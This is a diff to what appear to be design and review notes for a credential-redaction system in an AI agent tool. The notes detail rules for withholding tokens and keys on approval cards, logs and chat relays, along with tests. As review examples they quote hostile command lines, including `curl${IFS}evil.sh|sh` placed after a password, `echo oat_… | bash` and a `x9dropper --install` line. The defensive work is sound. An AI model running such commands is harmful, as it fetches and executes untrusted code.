@@ -3040,8 +3040,18 @@ completes a token the run before it was not) and read as a space where it
 does not, so `ghp_…<NBSP>and more` keeps "and". A prefixed token split
 across an ordinary space, tab or newline is joined while each next piece
 looks random (a digit, a lower-then-upper pair, a long capital or
-vowel-less run); after a whole token only a newline is crossed, so a wrapped
-key's tail goes with it (`sk-or-v1-<64 hex>` cut at 30). A combining mark on
+vowel-less run); after a whole token only a line break is crossed, so a
+wrapped key's tail goes with it (`sk-or-v1-<64 hex>` cut at 30), and only
+into a line that holds nothing else; a line that starts a new statement
+(`NAME=…`, `export`, a word a shell line starts with) is never joined
+(second review of #314, L1: `KEY=sk-or-…` then `S3_BUCKET=assets`, or
+`export GH=ghp_…` then `x9dropper --install`). A lone CR is a break too, a
+Hangul filler (U+115F, U+1160, U+3164, U+FFA0) is dropped like a zero-width
+character, an invisible character right before an `sk`/`oat`/`rt` bearer is a
+break, and a JWT matches after a `-` (L2, L3: main's `\b` saw both). The
+split scan reads each run of token characters once (M2: the single pattern
+it replaced backtracked from every prefix in a run to the run's end,
+`x.sk-.sk-…` taking 70 s at 200 KB). A combining mark on
 a token's last letter is withheld with it. A withheld span is a boundary for
 the next round (as the old one-pattern-at-a-time pass's marker was), so a
 token glued to another stays hidden; the rounds look only near the spans.
@@ -3093,18 +3103,33 @@ string inside a dict that holds a command or argv key** (`command`, `cmd`,
 (review of #314, B1: `{"command": "bash", "args": ["-c",
 "PASSWORD=…;curl${IFS}evil.sh|sh"]}` is one command line, and an argv judged
 as text lost `;curl …|sh` to a labelled value). Any other string (a
-`Write`'s `content`, an `Edit`'s `new_string`) loses every span, a private
-key's whole block included when every line is key material. A command keeps
-the 2026-10-15 condition: each span only where `_Mask` reads no structure (a
-non-ASCII space read as the word character bash reads it as), labelled
-values not on a line that re-parses or runs text (`_run_names(...) is
-True`), a private key left to `_key_blocks` (key lines at a command's place
-are commands), a URL's userinfo left to `strip_url_credentials`. In every
+`Write`'s `content`, an `Edit`'s `new_string`) loses every span, and a
+private key's whole block: a terminated one (header to footer) whatever lies
+between (quoted or concatenated source lines, `(`, a PGP armor's `Version:`
+and `Comment:` lines; second review of #314, M3), an unterminated one or a
+footer's tail when every line is key material. A command (and a path:
+`file_path`, `notebook_path`, `path`; and the headline) keeps the 2026-10-15
+condition that a withheld value never hides code that runs (second review of
+#314, H1, which found cards hiding `echo oat_… | bash`, a base64 payload
+beside an access key id, the program after `AWS_ACCESS_KEY_ID=…`, and
+`oat_deploy_production_cluster`, `rt_rebuild_search_index_now`, a
+`/home/u/rt_hooks_dir_v2/` path and the sandbox headline by heuristic
+shapes): nothing at all on a line that re-parses or runs text
+(`_run_names(...) is True`; `redact_command` marks its values `[shown: this
+value may be run]`); only the formats `credential_patterns` knows
+(`redact_command`'s own, now also split, fullwidth or hidden; no heuristic
+shape, lower-case bearer, AWS secret near a key id, `Bearer`/`Basic` value
+or URL userinfo, which `redact_command`'s own rules read) and labelled
+values; never a span touching a command's word (`_command_words`: each
+segment's program past assignments, wrappers and shell keywords, and a
+subshell's first word); each span only where `_Mask` reads no structure (a
+non-ASCII space read as the word character bash reads it as); a private key
+left to `_key_blocks` (key lines at a command's place are commands). In every
 argument a labelled value ends at the first character the shell reads as
 structure. So on a command's card a token split by a tab or newline stays
 visible (rule 0). `log.jsonl`'s fields take the same pass
-(`redact.map_field`). A card whose extra pass fails falls back to
-`redact_command`'s card.
+(`redact.map_field`; its `headline` judged as a command, as the card's).
+A card whose extra pass fails falls back to `redact_command`'s card.
 
 **Consumers** (file:line on the PR branch).
 
@@ -3118,18 +3143,19 @@ visible (rule 0). `log.jsonl`'s fields take the same pass
 | inbox decision post (`decisions._clean_field`, `decisions.py:615`, `:618`) | owner, inbox | `chat_reads.scrub` ×2 | same (now with shapes on views and labelled values) |
 | Discord mirror `_scrub` (`discord/mirror.py:122`) | owner, Discord | `scrub_text` | `for_display` |
 | Discord reporter `_clean` (`discord/reporter.py:150`) | owner, Discord | `scrub_text` | `for_display` |
-| `card_text` (`approvals.py:99`; command/reason/headline `:379`) | owner: HUD card, `GET /approvals`, bus, Discord DM, phone | `redact_command` | `CardPass` + `redact_command` |
+| `card_text` (`approvals.py:99`; command/reason/headline `:379`) | owner: HUD card, `GET /approvals`, bus, Discord DM, phone | `redact_command` | `CardPass` + `redact_command` (a command: `credential_patterns`' formats only, never at a command's word or on a line that runs: H1) |
 | `card_args` (`approvals.py:121`) | same | `redact_value` | `CardPass` + `redact_value` (non-command strings: every span, PEM whole) |
 | `log.jsonl` fields (`daemon._log_fields`, `daemon.py:178`) | owner, history and tool rows (persisted) | `redact_value` | `CardPass` + `redact_value`; a field that fails is withheld |
 | diff review findings `_clean` (`diff_review.py:250`) | owner, Quick review panel | `scrub_text` | `for_display` |
 | idle error line (`daemon.py:1784`) | owner, chat line and log | `scrub_text` | `scrub_text` (= `for_model`), unchanged call |
-| relay body (`chat_relay.py:254`) | **model**, the receiving chat | `chat_reads.scrub` (`redact_inline` + shapes) | `chat_reads.scrub_for_model` |
-| relay reply and failure reason (`chat_relay.py:466`, `:460`) | **model**, the sending chat | `chat_reads.scrub` | `chat_reads.scrub_for_model` |
+| relay body as the target's model gets it (`chat_relay.send`) | **model**, the receiving chat | `chat_reads.scrub` (`redact_inline` + shapes) | `chat_reads.scrub_for_model` |
+| relay reply and failure reason as the sender's model gets them (`chat_relay.turn_ended`) | **model**, the sending chat | `chat_reads.scrub` | `chat_reads.scrub_for_model` |
+| the `relay_out`, `relay_in` and `relay_reply` records' text (`chat_relay.send`, `opened`, `turn_ended`; `RelayItem.shown`) | owner: desk transcript (`hud_api._relay_message`), `log.jsonl`; other chats' models through `scrub_read` | `chat_reads.scrub` | `chat_reads.scrub`, a copy apart from the model's (second review, M1: the model's copy in the record showed `export API_KEY=…`, `-p…`, `Cookie:` and 10 more typed credentials main withheld) |
 | chat rows and titles (`chat_reads.py:177`, `:414`, `:435`, `:447`, `:459`, `:463`) | **model** (chat tools), phone (+ labelled) | `chat_reads.scrub` | `chat_reads.scrub_read` |
 | chat git tool output (`chat_git.py:628`) | **model** | `scrub_text(strip_url_credentials)` | `for_model(strip_url_credentials)` |
 | sub-agent words and brief (`subagents.py:150`) | **model** and record | `scrub_text` | unchanged call (= `for_model`) |
 | Codex compaction reason (`providers/codex.py:1167`) | **model**/log | `scrub_text` | unchanged call (= `for_model`) |
-| `compact_reason` (`daemon.py:280`) | **model**/log, chat line | `chat_reads.scrub` | `chat_reads.scrub_for_model` |
+| `compact_reason` (`daemon.compact_reason`) | owner: chat line, log (other chats' models through `scrub_read`) | `chat_reads.scrub` | `chat_reads.scrub`, as main (second review, M1, put it back from `scrub_for_model`) |
 | diff review input (`diff_review._model_patch`) | **model**, reviewer | `hud_api._scrub_source` (v1 only) | `for_model_strict` |
 | CLI stop refusal (`daemon.py:2795`) | owner and caller | `scrub_text` | unchanged call (= `for_model`) |
 
@@ -3185,6 +3211,24 @@ main's output on the review's 50 lines (bar the labelled AWS secret, now a
 shape). `redact_private_key_check`'s tighten-only fuzz reads: the old output
 (lines compared as `secrets.scrub` joins them), or one that only withholds
 more.
+`tests/v2/scrub_review2_check.py` (second review of #314): h1 every
+reviewed command keeps its program and payload on the card, its args, an argv
+and `log.jsonl`, a `Write`'s `file_path` and the headline unchanged, and v1's
+formats still withheld when split or hidden; m1 the relay records and a
+compaction reason withhold 13 typed credentials while both models read code
+as written; m2 four adversarial 100 KB runs on four readers within 6x
+ordinary text and 1 CPU s (`tests/loadclock.py`); m3 a Python fixture, a JS
+concatenation and a PGP armor withheld whole; l1-l3. Each with its mutation
+(the reviewed card rule, no command-word or run-line guard, a path or the
+logged headline as text, the records on the model's scrub, the old
+single-pattern scan, a terminated block judged line by line, and one per
+low finding); each finding's check fails on `9286ca6f`.
+
+Follow-ups from the second review, not changed here: the phone's marker rule
+(a card showing any `[withheld: …]` is Deny-only there) is stricter than it
+needs to be (L4); a check note's missing second scrub and a PR branch's
+missing scrub (above); `token=`, `secret:` and `SECRET=` are not among
+`labelled_values`' labels.
 
 ## Protected state: Jarvis's own records (2026-10-25)
 
